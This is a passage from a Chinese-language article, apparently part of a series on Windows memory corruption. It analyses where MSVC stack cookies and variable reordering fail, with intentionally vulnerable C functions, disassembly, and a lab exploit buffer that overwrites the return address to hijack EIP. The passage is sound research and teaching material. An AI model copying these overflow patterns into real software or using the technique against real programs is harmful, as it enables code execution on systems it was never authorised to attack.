    uint32_t dwVar1 = 1;
    uint32_t* pdwVar2 = &gdwGlobalVar;
    *pdwVar2 = dwVar1;
    }
图35 包含未引用数组的函数
我们希望MSVC的安全排序规则总是将数组放置在内存的最高区域，以为函数提供安全保护，然而汇编代码表明，事情并非如此。
    push ebp
    mov ebp,esp
    sub esp,18
    xor eax,eax
    mov dword ptr ss:[ebp-18],eax
    mov dword ptr ss:[ebp-14],eax
    mov dword ptr ss:[ebp-10],eax
    mov dword ptr ss:[ebp-C],eax
    mov dword ptr ss:[ebp-8],1
    mov dword ptr ss:[ebp-4],
    mov ecx,dword ptr ss:[ebp-4]
    mov edx,dword ptr ss:[ebp-8]
    mov dword ptr ds:[ecx],edx
    mov esp,ebp
    pop ebp
    ret
图36 图35中的源代码对应的汇编代码
如您所见，MSVC已经从函数中删除了堆栈Cookie。同时，MSVC还将Buf数组放在了内存的最低区域，这违背了其典型的安全策略；如果缓冲区未被引用，它将不考虑GS缓冲区的安全重排序规则。这样就提出了一个有趣的问题：何谓引用？令人惊讶的是，答案并不像我们所期望的那样（引用就是函数中对变量的任何使用）。针对某些类型的变量使用并不能算作引用，因此不会影响变量的排序。
    void Test() {
    uint8_t Buf[16]};
    uint32_t dwVar1 = 1;
    uint32_t* pdwVar2 = &gdwGlobalVar;
    Buf[0] = 'A';
    Buf[1] = 'B';
    Buf[2] = 'C';
    *pdwVar2 = dwVar1;
    }
图37 一个被引用了3次的数组和两个被引用了2次的局部变量
在上面的例子中，我们希望Buf被放置在内存的第一个（最高）槽（slot）中，因为它被引用了三次，而dwVar1和pdwVar2各只被引用了两次。这个函数的汇编代码与此相矛盾。
    push ebp
    mov ebp,esp
    sub esp,18
    mov dword ptr ss:[ebp-8],1
    mov dword ptr ss:[ebp-4],
    mov eax,1
    imul ecx,eax,0
    mov byte ptr ss:[ebp+ecx-18],41
    mov edx,1
    shl edx,0
    mov byte ptr ss:[ebp+edx-18],42
    mov eax,1
    shl eax,1
    mov byte ptr ss:[ebp+eax-18],43
    mov ecx,dword ptr ss:[ebp-4]
    mov edx,dword ptr ss:[ebp-8]
    mov dword ptr ds:[ecx],edx
    mov esp,ebp
    pop ebp
    ret
图38 图37中的源代码对应的汇编代码
尽管Buf是一个数组，而且比其他任何一个局部变量使用得更多，但是，它却被保存在栈内存的最低处EBP–0x18。上面的汇编代码的另一个有趣的细节是，MSVC没有给图38中的函数添加安全Cookie检查。这就意味着，该返回地址仍会受到经典堆栈溢出以及任意写入漏洞的影响。
    #include
    #include
    uint8_t Exploit[] =
    "AAAAAAAAAAAAAAAA"// 16 bytes for buffer length
    "\xde\xc0\xad\xde"// New EIP 0xdeadc0de
    "\x1c\xff\x19\x00"; // 0x0019FF1c
    uint32_t gdwGlobalVar = 0;
    void OverflowOOBW(uint8_t* pInputBuf, uint32_t dwInputBufSize) {
    uint8_t Buf[16];
    uint32_t dwVar1 = 1;
    uint32_t* pdwVar2 = &gdwGlobalVar;
    for (uint32_t dwX = 0; dwX < dwInputBufSize; dwX++) {
    Buf[dwX] = pInputBuf[dwX];
    }
    *pdwVar2 = dwVar1;
    }
图39 越界写入漏洞
编译并执行上面的代码会导致一个没有堆栈Cookies和没有进行安全的变量排序的函数，这样的话，攻击者就可以通过精确覆盖0x0019FF1c处的返回地址来劫持EIP（在本例中，我已经禁用了ASLR）。
图40通过越界写入漏洞覆盖返回地址实现EIP劫持
根据这些实验，我们可以得出如下所示的结论：
  1. MSVC中存在一个安全漏洞：错误地评估了一个函数对堆栈溢出攻击的潜在敏感性。
  2. 这个安全漏洞源于MSVC使用某种形式的内部引用次数来决定变量顺序，而当一个变量的引用次数为零时，它被排除在常规的安全排序和堆栈Cookie安全缓解措施之外（即使它是一个GS缓冲区）。
  3. 按索引读/写数组不计入引用次数。因此，以这种方式访问数组的函数将缺乏针对堆栈溢出漏洞的保护。
对于可能无法适当防止堆栈溢出的代码模式，我还有几个其他的想法，首先是结构体/类的概念。虽然函数栈帧内的变量排序没有标准化或约定俗成（完全由编译器决定），但对于结构体来说，情况就不一样了；编译器必须精确地遵循源代码中声明变量的顺序。因此，如果一个结构体中包含一个数组，后面还有额外的变量，这些变量就无法安全地重新排序，因此，可能会因溢出而被破坏。
    struct MyStruct {
    char Buf[16];
    uint32_t dwVar1;
    uint32_t *pdwVar2;
    };
    void OverflowStruct(uint8_t* pInputBuf, uint32_t dwInputBufSize) {
    struct MyStruct TestStruct = { 0 };
    TestStruct.dwVar1 = 1;
    TestStruct.pdwVar2 = &gdwGlobalVar;
    memcpy(TestStruct.Buf, pInputBuf, dwInputBufSize);
    *TestStruct.pdwVar2 = TestStruct.dwVar1;
    }
图41 通过结构体实现任意写入的堆栈溢出
上面用于结构体的概念同样也适用于C++类，前提是它们被声明为局部变量并在堆栈上分配内存空间。
    class MyClass {
    public:
    char Buf[16];
    uint32_t dwVar1;
    uint32_t* pdwVar2;
    };
    void OverflowClass(uint8_t* pInputBuf, uint32_t dwInputBufSize) {
    MyClass TestClass;
    TestClass.dwVar1 = 1;
    TestClass.pdwVar2 = &gdwGlobalVar;
    memcpy(TestClass.Buf, pInputBuf, dwInputBufSize);
    *TestClass.pdwVar2 = TestClass.dwVar1;
    }
图42 通过类实现任意写入的堆栈溢出
当涉及到类时，一个额外的攻击手法是破坏其vtable指针。这些vtable包含指向可执行代码的其他指针，这些可执行代码可以在RET指令之前通过被破坏的类的方法进行调用，从而提供了一种通过破坏局部变量来劫持EIP的新方法，而无需使用任意写入原语。
最后一个容易被局部变量破坏的代码模式的例子是使用运行时堆栈分配函数，如_alloca。由于这类函数的内存分配过程，是在函数的栈帧已经建立后，通过减去ESP来实现的，因此，这类函数分配的内存将始终处于较低的栈内存中，所以无法重新排序或免受此类攻击的威胁。
    void OverflowAlloca(uint8_t* pInputBuf, uint32_t dwInputBufSize) {
    uint32_t dwValue = 1;
    uint32_t* pgdwGlobalVar = &gdwGlobalVar;
    char* Buf = (char*)_alloca(16);
    memcpy(Buf, pInputBuf, dwInputBufSize);
    *pgdwGlobalVar = dwValue;
    }
图43 易受_alloca局部变量破坏问题影响的函数
请注意，尽管上面的函数中没有数组，但MSVC足够聪明，它知道只要使用了_alloca函数就有必要在生成的函数代码中放入堆栈Cookie。
这里讨论的技术代表了一种现代Windows的堆栈溢出的攻击面，到目前为止，还没有明确的安全缓解措施。然而，它们的可靠利用依赖于这里讨论的特定代码模式以及（在任意写入的情况下）一个链式内存泄漏原语。
## 小结
对于堆栈溢出漏洞，虽然现代的操作系统已经提供了许多防御机制，但在今天的Windows应用程序中仍然存在并且可被利用。如果存在非Safeseh模块，那么利用这种溢出漏洞就比较容易，因为还没有哪种默认的安全缓解机制强大到可以防止局部变量破坏而导致的任意写入攻击。就目前来说，防御这类攻击的最强机制是ASLR，为了绕过这种机制，攻击者需要借助于非ASLR模块或内存泄漏漏洞。正如我们在这篇文章中所展示的那样，非Safeseh模块和非ASLR模块在如今的Windows
10系统以及许多第三方应用程序中仍不乏足迹。
与过去相比，尽管堆栈溢出漏洞的利用技术变得愈加复杂，但与堆中的其他内存破坏类型的漏洞相比，堆栈溢出是最容易理解的一个。在本系列的未来文章中，我们将继续深入探讨现代的Windows堆破坏漏洞，并希望对大家的学习有所帮助。